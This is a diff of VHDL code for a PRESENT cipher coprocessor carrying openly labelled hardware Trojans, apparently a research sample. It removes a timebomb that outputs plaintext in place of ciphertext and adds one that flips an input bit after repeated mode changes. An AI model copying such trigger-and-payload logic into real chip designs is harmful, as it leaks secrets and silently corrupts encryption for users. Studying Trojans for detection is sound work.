@@ -2,11 +2,9 @@ library ieee;
 use ieee.std_logic_1164.all;
 use ieee.numeric_std.all;
 
--- Trojan 7: trigger = Timebomb which triggers after each (2^k)-1 events of 
--- ciphertext(43 downto 40) = data_in(59 downto 56), i.e. when 4 specific bits of the
--- computed ciphertext are equal to 4 specific bits of the input data AND the current operation is 
--- an encryption
--- payload = ovewrite computer ciphertext with input data (plaintext)
+-- Trojan 7: trigger = Timebomb which triggers after each 2^k crypto operation changes, i.e
+-- changes from encryption to decryption (change in mode_sel(0))
+-- payload = flip the LSBit of the input data
 
 entity present_Trojan7 is
         port (
@@ -42,21 +40,67 @@ architecture rtl of present_Trojan7 is
                 out_ena,
                 load_ena        : std_logic;
 
-        signal  ready_cu : std_logic;
-
+        signal  mode_sel_last : std_logic;
         signal  trojan_trig,
-                trojan_counter_rst,
-                trojan_counter_event : std_logic;
+                trojan_counter_ena,
+                trojan_xor_out : std_logic;
 
-        constant TROJAN_COUNTER_WIDTH : natural := 2; -- final trojan counter width value ?
-
+        signal  trojan_data_in : std_logic_vector(63 downto 0);
+        
+        constant TROJAN_COUNTER_WIDTH : natural := 2; -- TODO : what will this constant's final value be?
+        constant TROJAN_COUNTER_MAX_VALUE : std_logic_vector(TROJAN_COUNTER_WIDTH-1 downto 0) := (others => '1');
         signal  trojan_counter_out : std_logic_vector(TROJAN_COUNTER_WIDTH-1 downto 0);
-        signal  trojan_mux_out : std_logic_vector(63 downto 0);
-
-        constant TROJAN_COUNTER_MAX_VALUE : std_logic_vector(TROJAN_COUNTER_WIDTH - 1 downto 0) := (others => '1');
 begin
         -- mode_sel(1) = 1 -> 128-bit key, 0 -> 80-bit key
         -- mode_sel(0) = 1 -> Decrypt, 0 -> Encrypt       
+        
+        -- store the current value of the mode_sel(0) bit in order to compare it to the next cycle's value.
+        -- The below flip-flop and the combinatorial process are a synthesizable way to check for a signal value
+        -- change, like the 'event attribute does for simulation purposes.
+        mode_sel_ff : entity work.dflip_flop
+                port map(
+                        clk => clk,
+                        ena => ena,
+                        rst => rst,
+                        d => mode_sel(0),
+                        q => mode_sel_last
+                );
+
+        -- compare the current mode_sel(0) value with the previous one
+        mode_sel_comp_process : process(mode_sel(0), mode_sel_last)
+        begin
+                if ((mode_sel(0) XOR mode_sel_last) = '1') then -- if the values are different
+                        trojan_counter_ena <= '1';
+                else
+                        trojan_counter_ena <= '0';
+                end if;
+        end process mode_sel_comp_process;
+
+        -- trojan counter :counts the changes of cryptographic operation, i.e. changes in the value of mode_sel(0)
+        trojan_counter : entity work.counter
+                generic map (
+                        COUNTER_WIDTH => TROJAN_COUNTER_WIDTH
+                )
+                port map(
+                        clk => clk,
+                        cnt_ena => trojan_counter_ena,
+                        rst => rst,
+                        count => trojan_counter_out
+                );
+        
+        -- Trojan triggers when the counter reaches its max value, i.e. 2^(TROJAN_COUNTER_MAX_VALUE) - 1
+        trojan_trig <= '1' when trojan_counter_out = TROJAN_COUNTER_MAX_VALUE else '0';
+        
+        -- Trojan payload : flip the LSBit of the input data
+        trojan_payload_xor : entity work.xor_2
+                port map(
+                        a => trojan_trig,
+                        b => data_in(0),
+                        y => trojan_xor_out
+                );
+
+        -- tampered input data
+        trojan_data_in <= data_in(63 downto 1) & trojan_xor_out;
 
         control_unit : entity work.present_control_unit
                 port map(
@@ -76,9 +120,8 @@ begin
 
                         key_sched_ena => key_sched_ena,
                         out_ena       => out_ena,
-                        ready         => ready_cu
+                        ready         => ready
                 );
-        ready <= ready_cu;
 
         key_sched : entity work.key_schedule_top
                 port map(
@@ -106,7 +149,7 @@ begin
                         rst        => rst,
                         ena        => enc_ena,
                         load_ena   => load_ena,
-                        plaintext  => data_in,
+                        plaintext  => trojan_data_in,                        
                         round_key  => key_mem_out,
                         ciphertext => ciphertext
                 );
@@ -117,29 +160,10 @@ begin
                         rst        => rst,
                         ena        => dec_ena,
                         load_ena   => load_ena,
-                        ciphertext => data_in,
+                        ciphertext => trojan_data_in,                        
                         round_key  => key_mem_out,
                         plaintext  => plaintext
                 );
-
-        trojan_counter_event <= '1' when (ciphertext(43 downto 40) = data_in(59 downto 56) and mode_sel(0) = '0') else '0';
-        
-        trojan_counter_rst <= '1' when (rst = '1' or (trojan_trig = '1' and ready_cu = '1')) else '0';        
-
-        -- trojan timebomb's counter
-        trojan_counter : entity work.counter
-                generic map(
-                        COUNTER_WIDTH => TROJAN_COUNTER_WIDTH
-                )
-                port map(
-                        clk => trojan_counter_event,  -- asynchronous -> count number of specified events
-                        cnt_ena => out_ena,           -- count when the final ciphertext is computed
-                        rst => trojan_counter_rst,                        
-                        count => trojan_counter_out                        
-                );
-        
-        -- the Trojan triggers when its counter reaches its max value
-        trojan_trig <= '1' when trojan_counter_out = TROJAN_COUNTER_MAX_VALUE else '0';
 
         -- mux controlling the input of the output register. Depending on the value of mode_sel(0)
         -- (0 for encryption, 1 for decryption), pass the output of the corresponding datapath to 
@@ -154,20 +178,6 @@ begin
                         sel     => dec_ena,
                         mux_out => mux_out
                 );
-        
-        -- trojan multiplexer : when the Trojan is inactive, the mux forwards the output data of the
-        -- encryption/decryption datapath, but when the trojan gets triggered, the mux passes the 
-        -- input data to its output.
-        trojan_mux : entity work.mux
-                generic map(
-                        DATA_WIDTH => 64
-                )
-                port map(
-                        input_A => mux_out,
-                        input_B => data_in,                        
-                        sel => trojan_trig,
-                        mux_out => trojan_mux_out
-                );
 
         -- Coprocessor-global output register, in order to preserve the computed output data,
         -- until new ones are available. This can be helpful when a device reading from
@@ -179,8 +189,8 @@ begin
                 port map(
                         clk  => clk,
                         ena  => out_ena,
-                        rst  => rst,                        
-                        din  => trojan_mux_out,
+                        rst  => rst,
+                        din  => mux_out,
                         dout => data_out
-                );                 
+                );                             
 end architecture;
